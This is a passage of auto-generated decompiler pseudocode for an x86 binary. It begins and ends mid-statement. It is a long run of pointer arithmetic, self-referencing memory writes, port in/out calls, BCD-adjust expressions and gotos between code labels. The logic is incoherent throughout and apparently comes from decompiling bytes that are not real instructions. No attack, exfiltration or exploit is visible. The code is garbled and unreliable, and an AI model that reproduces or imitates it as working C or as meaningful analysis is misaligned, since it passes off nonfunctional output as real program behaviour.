CONCAT11(uVar38 >> 8 ^ uVar132, uVar38) & 0xffffff00 |\n                                          (uVar38 - *(uVar27 + 0x52)) - uVar6;\n                                pcVar15 = uVar27 + 1;\n                                uVar129 = *(puVar83 + -4);\n                                uVar8 = uVar8 | *puVar36;\n                                pcVar18 = uVar122 | uVar8;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *0x354d484a = *0x354d484a + (uVar122 >> 8);\n                                *(puVar83 + -4) = puVar83;\n                                *(puVar83 + -8) = puVar47;\n                                puVar47 = puVar47 + 1;\n                                *(puVar83 + -0xc) = puVar47;\n                                *(puVar83 + -0x10) = puVar83 + -0xc;\n                                puVar84 = puVar83 + -0x15;\n                                *(puVar83 + -0x15) = puVar16;\n                                puVar121 = puVar121 ^ *puVar47;\n                                *(puVar47 + puVar121) = *(puVar47 + puVar121) + uVar8;\n                                pcVar15 = pcVar15 & 0xffffff00 | (pcVar15 ^ 0x15) - 0x36;\n                                *puVar26 = *puVar26 ^ puVar83 + -0x15;\n                                if (*puVar26 == 0) {\n                                    pcVar15 = pcVar15 | 0xc;\n                                    puVar84 = puVar83 + -0x19;\n                                    *(puVar83 + -0x19) = uVar128;\n                                }\n                            }\n                            else {\n                                puVar16 = puVar19 + pcVar15 * 2;\n                                *puVar16 = *puVar16 + (puVar19 >> 8);\n                                pcVar18 = *(puVar82 + 3);\n                                puVar84 = puVar82 + 3;\n                                *(puVar82 + 3) = puVar82 + 7;\n                                puVar16 = uVar122 + 0x50;\n                                *puVar16 = *puVar16 ^ uVar132;\n                                *puVar47 = *puVar47 + uVar132;\n                                cVar49 = uVar38 >> 8;\n                                puVar16 = uVar38 & 0xffff0000 | CONCAT11(cVar49 - *pcVar18, uVar38);\n                                if (*pcVar18 <= cVar49) {\n                                    *pcVar15 = *pcVar15 + uVar132;\n                                    pcVar15 = pcVar15 + -1;\n                                    *pcVar15 = *pcVar15 + pcVar15;\n                                    *(puVar82 + -1) = uVar128;\n                                    *(puVar82 + -5) = puVar47 + -1;\n                                    uVar6 = 9 < (pcVar15 & 0xf) | uVar6;\n                                    uVar39 = in(pcVar18 + 1);\n                                    *(puVar47 + -1) = uVar39;\n                                    puVar47 = *(puVar82 + -5);\n                                    puVar121 = *(puVar82 + -1);\n                                    uVar17 = *(puVar82 + 3);\n                                    uVar38 = *(puVar82 + 0xb);\n                                    puVar19 = *(puVar82 + 0xf);\n                                    iVar23 = *(puVar82 + 0x13);\n                                    pcVar15 = *(puVar82 + 0x17);\n                                    *pcVar15 = *pcVar15 + pcVar15;\n                                    puVar83 = puVar82 + 0x17;\n                                    *(puVar82 + 0x17) = uVar17;\n                                    *(puVar82 + 0x13) = puVar47;\n                                    puVar26 = iVar23 + 1;\n                                    *pcVar15 = *pcVar15 + pcVar15;\n                                    goto code_r0x00442471;\n                                }\n                                *pcVar15 = *pcVar15 + uVar132;\n                                pcVar15 = pcVar15 + -1;\n                                puVar47 = puVar47 + 1;\n                            }\n                            *(puVar84 + -4) = uVar17;\n                            *(puVar84 + -8) = pcVar15 + -0x47480000;\n                            puVar40 = puVar16 + 1;\n                            *(puVar84 + -0xb) = uVar17 - 1;\n                            *(puVar84 + -0xf) = pcVar18;\n                            pcVar15 = *(puVar84 + -0xf);\n                            iVar23 = uVar17 - 2;\n                            *(puVar84 + -0xf) = puVar121;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            piVar85 = *(pcVar15 + 0x23) * 0x25;\n                            puVar36 = pcVar15 | 0x29;\n                            iVar37 = *piVar85;\n                            *puVar36 = *puVar36 | puVar36;\n                            uVar6 = 9 < (puVar36 & 0xf) | uVar6;\n                            *piVar85 = piVar85 + 1;\n                            uVar122 = *(piVar85 + 3);\n                            *(piVar85 + 2) = iVar23;\n                            uVar39 = *(piVar85 + 2);\n                            *(piVar85 + 2) = piVar85 + 6;\n                            *puVar47 = *puVar47 + iVar37;\n                            *(piVar85 + -2) = 0xc656272;\n                            *puVar121 = *puVar121 | uVar122 | 6;\n                            uVar122 = (uVar122 | 6) + 0x7e6b617b | 99;\n                            *(piVar85 + -6) = uVar39;\n                            *(piVar85 + -10) = uVar122;\n                            *(piVar85 + -0xe) = iVar37 + -1;\n                            *(piVar85 + -0x12) = puVar40;\n                            puVar36 = uVar122 - 2;\n                            uVar122 = iVar37 - 2;\n                            uVar122 = uVar122 & 0xffff0000 | CONCAT11(uVar122 >> 8 ^ *puVar40, uVar122);\n                            puVar87 = piVar85 + -10;\n                            puVar46 = uVar122 - 2;\n                            puVar26 = *(piVar85 + -0xe) + -1;\n                            cVar49 = puVar36;\n                            *puVar36 = *puVar36 + cVar49;\n                            cVar33 = puVar46;\n                            puVar46[puVar121 * 2] = puVar46[puVar121 * 2] + cVar33;\n                            uVar132 = puVar26;\n                            bVar131 = CARRY1(*puVar46, uVar132);\n                            bVar134 = SCARRY1(*puVar46, uVar132);\n                            *puVar46 = *puVar46 + uVar132;\n                            bVar133 = *puVar46 < '\\0';\n                            if (bVar131 || *puVar46 == 0) {\n                                if (bVar133) {\n                                    bVar134 = SCARRY1(cVar49, '\\x0e') != SCARRY1(cVar49 + '\\x0e', bVar131);\n                                    uVar7 = cVar49 + '\\x0e' + bVar131;\n                                    puVar36 = puVar36 & 0xffffff00 | uVar7;\n                                    bVar133 = uVar7 < '\\0';\n                                    goto code_r0x00442522;\n                                }\n                            }\n                            else {\ncode_r0x00442522:\n                                uVar129 = *(piVar85 + -10);\n                                puVar86 = piVar85 + -6;\n                                puVar19 = puVar121 + 1;\n                                out(*puVar121, puVar46);\n                                if (bVar134 == bVar133) {\n                                    *(puVar16 + 0x62) = *(puVar16 + 0x62) + iVar23;\n                                    uVar8 = puVar36;\n                                    *puVar36 = *puVar36 + uVar8;\n                                    *(uVar17 + 0x49) = *(uVar17 + 0x49) + cVar33;\n                                    uVar7 = *(puVar121 + 0x3a);\n                                    uVar6 = 9 < (uVar8 & 0xf) | uVar6;\n                                    uVar38 = puVar36 & 0xffff0000 |\n                                             CONCAT11((puVar36 >> 8) + uVar6, uVar8 + uVar6 * '\\x06') & 0xff0f;\n                                    puVar114 = piVar85 + -10;\n                                    *(piVar85 + -10) = uVar17 - 1;\n                                    *(piVar85 + -0xe) = puVar26 & 0xffffff00 | uVar132 ^ uVar7;\n                                    iVar37 = *(piVar85 + -0xe);\n                                    pcVar15 = uVar38 - 1;\n                                    *pcVar15 = *pcVar15 + pcVar15;\n                                    *puVar16 = *puVar16 + cVar33;\n                                    out(*puVar19, puVar46);\n                                    bVar131 = 0xfb90e8f1 < pcVar15;\n                                    pcVar15 = uVar38 + 0x46f170d;\n                                    if (bVar131) {\n                                        uVar128 = *(piVar85 + -10);\n                                        uVar27 = *puVar47;\n                                        uVar118 = *puVar47;\n                                        *puVar47 = (uVar118 - pcVar15) - bVar131;\n                                        puVar114 = piVar85 + -6;\n                                        if (*puVar47 != 0 &&\n                                            (SBORROW4(uVar27, pcVar15) != SBORROW4(uVar118 - pcVar15, bVar131)) ==\n                                            *puVar47 < 0) {\n                                            pcVar15 = pcVar15 & 0xffff0000 |\n                                                      CONCAT11((pcVar15 >> 8) + *(uVar38 + 0x46f1727), pcVar15);\n                                            puVar114 = piVar85 + -6;\n                                        }\n                                    }\n                                    else {\n                                        uVar132 = (pcVar15 - *pcVar15) - bVar131;\n                                        pcVar15 = pcVar15 & 0xffffff00 | uVar132;\n                                        *pcVar15 = *pcVar15 + uVar132;\n                                        *(piVar85 + -0xe) = puVar46;\n                                        iVar37 = *(piVar85 + -0xe);\n                                    }\n                                    *pcVar15 = *pcVar15 + pcVar15;\n                                    pcVar18 = uVar122 + 0x57;\n                                    *pcVar18 = *pcVar18 + cVar33;\n                                    *(puVar114 + -4) = iVar37;\n                                    *(puVar114 + -8) = puVar47;\n                                    iVar23 = uVar17 + 1;\n                                    iVar22 = *(puVar114 + -8);\n                                    puVar26 = iVar37 + 1;\n                                    pcVar18 = (pcVar15 & 0xffffff00 | pcVar15 ^ *(puVar47 + 0x41)) ^ 0x3057;\n                                    pcVar15 = uVar17 + 0xc;\n                                    cVar33 = puVar40 >> 8;\n                                    *pcVar15 = *pcVar15 + cVar33;\n                                    cVar49 = *pcVar15;\n                                    puVar86 = puVar114 + -8;\n                                    *(puVar114 + -8) = in_CS;\n                                    uVar132 = pcVar18;\n                                    if (cVar49 == '\\0') {\n                                        *pcVar18 = *pcVar18 + uVar132;\n                                        *puVar26 = *puVar26 + cVar33;\n                                        puVar47 = puVar47 ^ *puVar26;\n                                        puVar40 = puVar16 + 2;\n                                        iVar22 = iVar22 + -1;\n                                    }\n                                    pcVar15 = uVar17 + 8 + (puVar121 + 1) * 2;\n                                    *pcVar15 = *pcVar15 + (puVar26 >> 8);\n                                    out(puVar121[1], iVar22);\n                                    pcVar15 = (pcVar18 & 0xffffff00 | uVar132 + puVar114[puVar47 * 2 + -8]) + 0x7a077d +\n                                              CARRY1(uVar132, puVar114[puVar47 * 2 + -8]);\n                                    uVar132 = pcVar15;\n                                    *pcVar15 = *pcVar15 + uVar132;\n                                    uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                    puVar36 = pcVar15 & 0xffff0000 |\n                                              CONCAT11((pcVar15 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                    *(puVar114 + -0xc) = puVar114 + -8;\n                                    puVar19 = puVar121 + 9;\n                                    puVar16 = puVar40 + 1;\n                                    puVar46 = *(puVar114 + -0xc);\n                                }\n                                puVar121 = puVar19 + 1;\n                                uVar6 = 9 < (puVar36 & 0xf) | uVar6;\n                                uVar11 = CONCAT11((puVar36 >> 8) + uVar6, puVar36 + uVar6 * '\\x06') & 0xff0f;\n                                puVar36 = puVar36 & 0xffff0000 | uVar11;\n                                puVar87 = puVar86 + -3;\n                                *(puVar86 + -3) = puVar36;\n                                *puVar36 = *puVar36 + uVar11;\n                                puVar46[0x24] = puVar46[0x24] + puVar16;\n                            }\n                            cVar49 = puVar46 >> 8;\n                            *puVar47 = *puVar47 + cVar49;\n                            uVar132 = puVar36;\n                            *puVar36 = *puVar36 ^ uVar132;\n                            *puVar36 = *puVar36 + uVar132;\n                            *(puVar47 + 0x59200b2f) = *(puVar47 + 0x59200b2f) + (puVar16 >> 8);\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            *(puVar87 + -4) = puVar16;\n                            puVar114 = CONCAT21(puVar36 >> 0x10, (puVar36 >> 8) - uVar6) << 8;\n                            *puVar114 = *puVar114;\n                            *(puVar87 + -8) = puVar47;\n                            pcVar15 = *(puVar87 + -8);\n                            *(puVar87 + -8) = puVar121;\n                            *(puVar87 + -0xc) = puVar87 + -8;\n                            *(puVar87 + -0xf) = puVar47;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            (puVar26 + 0x21)[puVar46] = (puVar26 + 0x21)[puVar46] + (puVar26 >> 8);\n                            pcVar18 = pcVar15 + -0x5845263c;\n                            puVar88 = puVar87 + -0x13;\n                            *(puVar87 + -0x13) = iVar23;\n                            if (SBORROW4(pcVar15, 0x5845263c)) {\n                                uVar132 = pcVar18;\n                                puVar46[0x3a] = puVar46[0x3a] & uVar132;\n                                *pcVar18 = *pcVar18 - uVar132;\n                                *pcVar18 = *pcVar18 + cVar49;\n                                puVar88 = puVar87 + -0xe;\n                                puVar26 = *(puVar87 + -0x12) + 1;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                pcVar18 = pcVar18 & 0xffff0000 |\n                                          CONCAT11((pcVar18 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                iVar23 = iVar23 + 1;\n                            }\n                            *(puVar88 + -4) = puVar26;\n                            *(puVar88 + -8) = puVar88 + -4;\n                            *(puVar26 + 0x46) = *(puVar26 + 0x46) ^ puVar46;\n                            uVar6 = 9 < (pcVar18 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar18 >> 8) + uVar6, pcVar18 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar15 = pcVar18 & 0xffff0000 | uVar11;\n                            *pcVar15 = *pcVar15 + uVar11;\n                            *(puVar88 + -0xb) = uVar129;\n                            *(pcVar15 + 0x5b) = *(pcVar15 + 0x5b) & pcVar15;\n                            uVar118 = iVar23 + 1U ^ *puVar47;\n                            pcVar18 = puVar26 + -1;\n                            puVar36 = pcVar15 + -0x42002a39 ^ 0x41305835;\n                            uVar132 = *puVar36;\n                            uVar7 = pcVar18;\n                            *puVar36 = *puVar36 + uVar7;\n                            puVar36 = puVar36 + CARRY1(uVar132, uVar7) + 0x313d2d3c;\n                            *(puVar88 + -0xe) = pcVar18;\n                            uVar6 = 9 < (puVar36 & 0xf) | uVar6;\n                            uVar122 = CONCAT11(cVar49 - *puVar47, puVar46);\n                            puVar19 = puVar46 & 0xffff0000 | uVar122;\n                            uVar132 = *(puVar47 + 0x1e);\n                            pcVar45 = puVar47 ^ *puVar19;\n                            *(puVar88 + -0x12) = puVar19;\n                            pcVar15 = (puVar36 & 0xffff0000 |\n                                      CONCAT11((puVar36 >> 8) - uVar6, puVar36 + uVar6 * -6) & 0xff0f) + 0xf3badfc5;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(puVar88 + -0x16) = puVar88 + -0x12;\n                            *(puVar88 + -0x1a) = puVar88 + -0x16;\n                            uVar17 = *(puVar88 + -0x1a);\n                            *(puVar88 + -0x1a) = puVar16;\n                            *(puVar88 + -0x1e) = uVar118 - 1;\n                            puVar26 = puVar121 + -2;\n                            uVar27 = (pcVar18 & 0xffff0000 | CONCAT11((pcVar18 >> 8) - uVar132, uVar7)) + 1 ^\n                                     *(puVar121 + 0x3f);\n                            *(puVar88 + -0x21) = uVar118;\n                            uVar38 = uVar17 & 0xffffff00;\n                            pcVar15 = (uVar38 | (uVar17 ^ 0x4d) & 0xff) ^ 0x44;\n                            *(puVar88 + -0x25) = pcVar45;\n                            iVar23 = uVar118 + 1;\n                            puVar114 = puVar88 + -0x29;\n                            *(puVar88 + -0x29) = pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            if (*pcVar15 == '\\0') {\n                                uVar132 = pcVar15 - *(puVar121 + 0x33);\n                                pcVar15 = uVar38 | uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *pcVar45 = *pcVar45 + (uVar122 >> 8);\n                                uVar7 = uVar27;\n                                puVar16[0x31] = puVar16[0x31] ^ uVar7;\n                                *(puVar88 + -0x2d) = pcVar15;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *0x3324307a = *0x3324307a + uVar7;\n                                iVar37 = *(puVar88 + -0x2d);\n                                uVar122 = (uVar38 | (uVar132 & *(uVar27 + iVar23)) & 0xffffff1a) + 0x563d3241;\n                                puVar114 = puVar88 + -0x29;\n                                if ((POPCOUNT(uVar122 & 0xff) & 1U) == 0) {\n                                    puVar114 = puVar88 + -0x29 ^ *puVar26;\n                                    *puVar26 = *puVar26 - (uVar122 >> 8);\n                                }\n                                *0x202b0269 = *0x202b0269 ^ puVar114;\n                                pcVar15 = (uVar27 & 0xffffff00 | uVar7 & *puVar26) + 0x38;\n                                *pcVar15 = *pcVar15 + puVar46;\n                                puVar19 = puVar19 + 1;\n                                iVar23 = uVar118 + 3;\n                                pcVar45 = iVar37 + 1;\n                                *(puVar114 + -4) = pcVar45;\n                                uVar27 = *(puVar114 + -4);\n                                puVar26 = puVar121 + -1;\n                            }\n                            *(puVar114 + -4) = puVar19;\n                            piVar123 = pcVar45 + 1;\n                            uVar122 = *(puVar16 + 0x4c);\n                            uVar38 = *(puVar26 + 0x45);\n                            uVar39 = *(puVar114 + -4);\n                            *(puVar114 + -3) = iVar23;\n                            *(puVar114 + -7) = puVar114 + -3;\n                            *(puVar114 + -0xb) = puVar16 + 1;\n                            *(puVar114 + -0xf) = puVar114 + -0xb;\n                            *(puVar114 + -0x13) = piVar123;\n                            iVar37 = (puVar19 ^ uVar122 ^ uVar38) - 1;\n                            *(puVar114 + -0x17) = puVar114 + -0x13;\n                            puVar46 = puVar16 + 2;\n                            *(puVar114 + -0x1b) = iVar37;\n                            puVar36 = piVar123 + puVar26 + 3;\n                            cVar49 = iVar37;\n                            *puVar36 = *puVar36 + cVar49;\n                            uVar6 = 9 < ((uVar39 ^ 0x6d) & 0xf) | uVar6;\n                            uVar132 = puVar46 >> 8;\n                            *puVar46 = *puVar46 + uVar132;\n                            *(uVar27 + 0x1a) = *(uVar27 + 0x1a) & uVar132;\n                            puVar28 = puVar16 + 4;\n                            pcVar45[0x46] = pcVar45[0x46] + cVar49;\n                            iVar37 = iVar23 + -2;\n                            *(puVar114 + -0x1f) = uVar27;\n                            *(puVar114 + -0x1b) = puVar114 + -0x17;\n                            puVar19 = *(puVar114 + -0x17);\n                            puVar124 = *(puVar114 + -0x13);\n                            puVar19[0xd] = puVar19[0xd] ^ puVar28;\n                            puVar47 = puVar26 + 2;\n                            pcVar15 = *(puVar114 + -0xf);\n                            puVar89 = puVar114 + -0xb;\n                            ppuVar90 = puVar114 + -0xb;\n                            uVar132 = puVar124;\n                            *puVar124 = *puVar124 + uVar132;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            if (*pcVar15 == '\\0') {\n                                *puVar124 = *puVar124 + uVar132;\n                                puVar89 = puVar114 + -7;\ncode_r0x004426ca:\n                                *(puVar26 + 0x39) = *(puVar26 + 0x39) + puVar19;\n                                *(puVar89 + -4) = puVar124;\n                                *(puVar89 + -8) = piVar123;\n                                puVar19[0x11] = puVar19[0x11] ^ puVar124;\n                                puVar47 = puVar26 + 1 ^ *puVar28;\n                                uVar132 = *(puVar47 + 0x41);\n                                pcVar18 = puVar124 + -1;\n                                puVar16 = puVar16 + 3;\n                                *(puVar89 + -0xc) = puVar89 + -8;\n                                piVar123 = pcVar45 + 3;\n                                uVar6 = 9 < (pcVar18 & 0xf) | uVar6;\n                                *(puVar89 + -0x10) = puVar89 + -0xc;\n                                ppuVar90 = puVar89 + -0x14;\n                                *(puVar89 + -0x14) = iVar37;\n                                pcVar18 = (pcVar18 & 0xffff0000 |\n                                          CONCAT11((pcVar18 >> 8) + uVar6, pcVar18 + uVar6 * '\\x06') & 0xff0f) - 1;\n                                *pcVar18 = *pcVar18 + pcVar18;\n                                *piVar123 = *piVar123 + (pcVar15 + 1U ^ uVar132);\n                                puVar124 = pcVar18 | 0x534b3f23;\n                                *(puVar47 + 0x13) = *(puVar47 + 0x13);\n                                puVar28 = puVar16 & 0xffffff00 | puVar16 + *puVar16;\n                                *puVar124 = *puVar124 + puVar124;\n                                puVar19 = puVar19 + -1;\n                            }\n                            else {\n                                *piVar123 = *piVar123 - (puVar114 + -0xb);\n                                uVar7 = uVar132 & 0x2d;\n                                pcVar18 = segment(uVar130, puVar28 + piVar123 + 0x5c);\n                                *pcVar18 = *pcVar18 + uVar7;\n                                *(puVar19 + 0x33) = *(puVar19 + 0x33) ^ uVar7;\n                                pcVar15 = pcVar15 ^ *(puVar47 + puVar28);\n                                uVar6 = 9 < (uVar132 & 0xd) | uVar6;\n                                uVar7 = uVar7 + uVar6 * '\\x06';\n                                uVar132 = uVar7 + (0x90 < (uVar7 & 0xf0) | uVar6 * (0xf9 < uVar7)) * '`' &\n                                          *(iVar23 + 0x72);\n                                puVar124 = puVar124 & 0xffffff00 | uVar132;\n                                if (-1 < uVar132) goto code_r0x004426ca;\n                                uVar39 = LocalDescriptorTableRegister();\n                                *puVar124 = uVar39;\n                                puVar16[0x46] = puVar16[0x46] + puVar19;\n                            }\n                            ppuVar90[-1] = puVar28;\n                            puVar26 = puVar28 + 1;\n                            *(puVar28 + 0x33) = *(puVar28 + 0x33) ^ puVar19;\n                            pcVar15 = puVar124 + -1;\n                            uVar6 = 9 < (pcVar15 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar15 >> 8) + uVar6, pcVar15 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar18 = pcVar15 & 0xffff0000 | uVar11;\n                            uVar38 = *ppuVar90;\n                            ppuVar91 = ppuVar90 + 1;\n                            piVar41 = piVar123 + 1;\n                            uVar122 = *(pcVar18 + 0x53);\n                            uVar132 = uVar11;\n                            *pcVar18 = *pcVar18 + uVar132;\n                            *puVar47 = *puVar47 + uVar132;\n                            if (*puVar47 < '\\0') {\n                                *ppuVar90 = piVar41;\n                                uVar6 = 9 < uVar132 | uVar6;\n                                uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                uVar132 = uVar11;\n                                iVar115 = (pcVar15 & 0xffff0000 | uVar11 & 0xffffff00 | uVar132 + 0x95) + 0x3d202842 +\n                                          (uVar132 < 0x6b);\n                                ppuVar90[-1] = uVar38 ^ uVar122;\n                                uVar132 = iVar115 ^ *(iVar23 + 0x4b);\n                                puVar47 = puVar47 + 1;\n                                uVar122 = (uVar38 ^ uVar122) + 1;\n                                ppuVar90[-2] = puVar19;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                uVar11 = CONCAT11((iVar115 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                pcVar18 = ((iVar115 >> 8 | 0x365a00) & 0xffff00) << 8 | uVar11;\n                                ppuVar90[-3] = puVar19;\n                                *pcVar18 = *pcVar18 + uVar11;\n                                pcVar18 = pcVar18 | 0x305d3c15;\n                                ppuVar91 = ppuVar90 + -4;\n                                ppuVar92 = ppuVar90 + -4;\n                                ppuVar90[-4] = iVar37;\n                                puVar26 = puVar28;\n                                if (-1 < pcVar18) goto code_r0x00442740;\n                            }\n                            else {\n                                *ppuVar90 = puVar19;\n                                uVar122 = *ppuVar90;\ncode_r0x00442740:\n                                puVar28 = pcVar18 & 0xffffff00 | pcVar18 - 0x2d;\n                                pcVar15 = puVar28 | *puVar28;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *(puVar19 + 0x5a) = *(puVar19 + 0x5a) + uVar122;\n                                pcVar15 = *(ppuVar91 + -1);\n                                *(puVar26 + 0x4b) = *(puVar26 + 0x4b) ^ pcVar15;\n                                uVar17 = puVar19 - 1U ^ *(puVar19 + 0x45);\n                                *piVar41 = *piVar41 ^ uVar122;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                uVar132 = puVar26 >> 8;\n                                *(puVar26 + iVar37) = *(puVar26 + iVar37) + uVar132;\n                                *puVar47 = *puVar47 & piVar41;\n                                puVar19 = uVar17 + 1;\n                                iVar37 = *(ppuVar91 + 3);\n                                puVar28 = uVar122 + puVar26 * 2;\n                                *puVar28 = *puVar28 & puVar47;\n                                puVar28 = puVar26 & 0xffff0000 | CONCAT11(uVar132 & *puVar26, puVar26);\n                                iVar23 = *(ppuVar91 + 7);\n                                *(ppuVar91 + 7) = piVar123;\n                                uVar38 = pcVar15 & 0xffffff00 ^ 0x42523158;\n                                uVar122 = iVar23 - 1;\n                                puVar26 = uVar17 + 0x35 + puVar28 * 2;\n                                *puVar26 = *puVar26 ^ uVar122;\n                                *(ppuVar91 + 3) = ppuVar91 + 7;\n                                *(ppuVar91 + -1) = ppuVar91 + 3;\n                                *puVar28 = *puVar28 + (uVar38 >> 8);\n                                *(iVar37 + 0x20) = *(iVar37 + 0x20) ^ uVar38;\n                                uVar132 = uVar122 + *piVar123;\n                                uVar122 = uVar122 & 0xffffff00 | uVar132;\n                                puVar16 = uVar38 & 0x5c333a56;\n                                *puVar16 = *puVar16 & puVar16;\n                                *puVar16 = *puVar16 + puVar16;\n                                puVar16[0x49] = puVar16[0x49] + uVar132;\n                                ppuVar92 = ppuVar91 + -5;\n                                *(ppuVar91 + -5) = piVar123;\n                                piVar41 = piVar123;\n                            }\n                            uVar38 = *ppuVar92;\n                            *(iVar37 + 0x31) = *(iVar37 + 0x31) ^ uVar38;\n                            uVar38 = uVar38 - 1;\n                            puVar26 = puVar47 + 1;\n                            *(puVar47 + 0x35) = *(puVar47 + 0x35) ^ uVar122;\n                            *ppuVar92 = uVar38;\n                            puVar16 = puVar28 + 1;\n                            pcVar15 = uVar38 ^ 0x51;\n                            ppuVar92[-1] = puVar16;\n                            uVar7 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            puVar126 = piVar41 ^ *(puVar16 * 3);\n                            puVar114 = uVar38 & 0xffffff00;\n                            *puVar114 = *puVar114;\n                            ppuVar92[-2] = puVar114;\n                            uVar132 = *(puVar28 + 0x59);\n                            uVar38 = uVar122 + 1 & 0xffffff00;\n                            pcVar15 = ppuVar92[-2] ^ 0x414a5744;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            cVar49 = pcVar15 >> 8;\n                            *puVar16 = *puVar16 + cVar49;\n                            uVar132 = pcVar15 - 0x40U & *((uVar38 | uVar122 + 1 ^ uVar132) + (iVar37 + 2) * 2);\n                            iVar115 = ppuVar92[-1];\n                            uVar6 = 9 < (uVar132 & 0xf) | 9 < (uVar7 & 0xf) | uVar6;\n                            uVar11 = CONCAT11(cVar49 - uVar6, uVar132 + uVar6 * -6) & 0xff0f;\n                            pcVar18 = pcVar15 & 0xffff0000 | uVar11;\n                            *puVar26 = *puVar26 - (uVar38 >> 8);\n                            uVar132 = uVar11;\n                            *pcVar18 = *pcVar18 + uVar132;\n                            *pcVar18 = *pcVar18 + uVar132;\n                            ppuVar92[-1] = pcVar18;\n                            ppuVar92[-2] = puVar126;\n                            uVar122 = ppuVar92[-2];\n                            uVar6 = 9 < ((uVar132 ^ 0x47) & 0xf) | uVar6;\n                            uVar38 = (pcVar15 & 0xffff0000 |\n                                     CONCAT11((uVar11 >> 8) + uVar6, (uVar132 ^ 0x47) + uVar6 * '\\x06') & 0xff0f) ^\n                                     0x47413255;\n                            uVar6 = 9 < (uVar38 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar38 >> 8) + uVar6, uVar38 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar15 = uVar38 & 0xffff0000 | uVar11;\n                            ppuVar92[-2] = puVar26;\n                            ppuVar92[-3] = uVar122;\n                            ppuVar92[-4] = iVar115;\n                            uVar132 = uVar11;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            uVar35 = CONCAT11(uVar122 >> 8 ^ *(iVar37 + 0xc), uVar122);\n                            puVar16 = uVar122 & 0xffff0000 | uVar35;\n                            ppuVar93 = ppuVar92 + -4 ^ *puVar26;\n                            pcVar15 = *ppuVar93;\n                            uVar132 = uVar11;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            uVar7 = uVar11 + 0xa7;\n                            puVar26 = puVar126 + 1;\n                            uVar1 = in(uVar35);\n                            *puVar126 = uVar1;\n                            uVar8 = uVar35 >> 8;\n                            *puVar16 = *puVar16 & uVar8;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            uVar122 = *puVar19;\n                            *ppuVar93 = puVar26;\n                            ppuVar93[-1] = puVar26;\n                            ppuVar93[-2] = uVar38 & 0xffff0000 | uVar11 & 0xffffff00 | uVar7;\n                            uVar132 = puVar16[0x41];\n                            uVar38 = ppuVar93[-2];\n                            pcVar18 = (pcVar15 ^ uVar122) + 2;\n                            *pcVar18 = *pcVar18 + uVar8;\n                            uVar38 = uVar38 ^ 0x642f4323;\n                            *(ppuVar93 + -7) = uVar128;\n                            uVar6 = 9 < (uVar38 & 0xf) | 9 < ((uVar7 ^ uVar132) & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar38 >> 8) - uVar6, uVar38 + uVar6 * -6) & 0xff0f;\n                            pcVar15 = uVar38 & 0xffff0000 | uVar11;\n                            *puVar26 = *puVar26 ^ puVar26;\n                            cVar49 = uVar11;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            uVar122 = pcVar15 ^ 0x4a374a59;\n                            *(ppuVar93 + -0xb) = puVar26;\n                            iVar23 = *(ppuVar93 + -0xb);\n                            uVar6 = 9 < (uVar122 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar122 >> 8) + uVar6, uVar122 + uVar6 * '\\x06') & 0xff0f;\n                            uVar122 = uVar122 & 0xffff0000;\n                            pcVar15 = uVar122 | uVar11;\n                            ppuVar93[-3] = ppuVar93 + -2;\n                            uVar132 = uVar11;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            iVar31 = ppuVar93[-3];\n                            uVar6 = 9 < ((uVar132 ^ 0x42) & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, (uVar132 ^ 0x42) + uVar6 * '\\x06') & 0xff0f;\n                            *(iVar37 + 0x27) = (*(iVar37 + 0x27) - (uVar122 | uVar11)) - uVar6;\n                            uVar132 = uVar11 - *(iVar37 + 0x2e);\n                            pcVar15 = uVar122 | uVar11 & 0xffffff00 | uVar132;\n                            uVar118 = iVar37 + 5U & *(iVar31 + 0x72 + pcVar15 * 2);\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar122 = *(iVar115 + 1);\n                            puVar46 = iVar31 + 1;\n                            ppuVar93[-1] = ppuVar93[-1];\n                            pcVar15 = pcVar15 ^ 0xb047c50;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *(uVar118 + 0x3a) = iVar115 + 1 + (*0x7a2e2023 < pcVar15 >> 8) + *(uVar118 + 0x3a);\n                            ppuVar93[-2] = uVar118;\n                            iVar37 = 